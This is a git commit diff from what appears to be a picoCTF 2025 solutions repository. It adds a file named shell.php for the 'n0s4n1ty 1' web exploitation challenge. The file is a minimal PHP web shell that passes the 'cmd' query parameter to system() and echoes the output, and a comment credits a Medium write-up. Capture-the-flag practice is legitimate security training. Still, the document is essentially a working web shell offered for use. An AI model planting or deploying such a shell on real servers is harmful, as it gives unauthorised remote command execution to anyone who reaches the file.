cfdfed2ade925806015ef1ed6da960c9bfb16412
AshutoshChaudhary <162051298+AshutoshChaudhary-lgtm@users.noreply.github.com>
2025-04-20 17:53:12 +0530

    482

--- n0s4n1ty 1(Easy) 482/shell.php
+++ n0s4n1ty 1(Easy) 482/shell.php
@@ -1,1 +1,9 @@
-exec("/bin/bash -c 'ls root");
+<!-- Credits for the code: https://medium.com/@inferiorak/n0s4n1ty-1-web-exploitation-picoctf-2025-edcde6045088 -->
+<?php
+if(isset($_GET['cmd'])){
+    echo "<pre>";
+    $cmd = $_GET['cmd'];  
+    system($cmd);         
+    echo "</pre>";
+}
+?>
